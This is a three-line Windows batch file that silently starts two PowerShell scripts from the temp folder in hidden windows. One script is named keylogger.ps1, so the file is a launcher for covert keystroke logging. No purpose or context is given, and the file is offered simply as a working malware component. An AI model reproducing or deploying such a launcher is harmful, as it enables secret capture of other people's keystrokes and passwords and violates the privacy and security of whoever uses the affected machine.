@echo off
powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/keylogger.ps1"
powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/l.ps1"